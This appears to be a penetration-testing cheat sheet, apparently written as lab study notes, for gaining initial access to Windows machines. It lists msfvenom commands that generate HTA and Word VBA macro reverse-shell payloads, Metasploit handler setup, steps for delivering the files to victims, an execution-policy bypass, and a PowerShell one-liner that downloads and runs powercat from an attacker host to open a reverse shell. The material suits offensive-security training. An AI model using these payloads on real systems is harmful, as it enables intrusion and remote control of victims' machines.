## Malicouis HTA (HTML Appplication) payload via msfvenom

1. Create the payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<local port> -f hta-psh -o thm.hta`  
2. Set up a listener on the attack box:  `sudo nc -lvp 443`    
3. Delivery the payload to the target  
4. Wait for the reverse shell 

## Malicouis HTA via metasploit

1. exploit module: `exploit/windows/misc/hta_server`  
2. set LHOST, LPORT, and SRVHOST  
3. set payload:  `set payload windows/meterpreter/reverse_tcp`
4. run the exploit(starts the listener): `exploit`  
5. Get the victim to visit the site  
6. Wait for the reverse shell  

## Embed malicious vba script in a MS Word Document  

1. Create the vba script with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<local port> -f vba`  
2. Modify the vba:  Replace `Workbook_Open()` with `Document_Open()`  . No changes required if using Excel Document
3. Add vba script to Word document: 
   - View` -> `Macros 
   - Give the macro a name
   - Change `Macros in` to `Document1 (document)`
   - Create
   - Paste vba script in the macro window
   - Save the document as `Word 97-2003 Document`
4. Start metasploit  
   - `use exploit/multi/handler`
   - `set payload generic/shell_reverse_tcp`
   - set LHOST and LPORT
   - Start the listener: `exploit`
5. Delivery the payload(MS Document)
6. Wait for the reverse shell

## Powershell

1. Change Powershell execution policy: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` or `powershell -ex bypass -File <powershell script>.ps1`
2. Staging attack box:
   - `git clone https://github.com/besimorhino/powercat.git`
   - `cd powercat`
   - `python3 -m http.server <port>`
   - In a separater terminal window: `nc -lvp <port>`
3. On the victim box:
   - `powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attack box>:<port>/powercat.ps1');powercat -c <attack box> -p <port> -e cmd"`



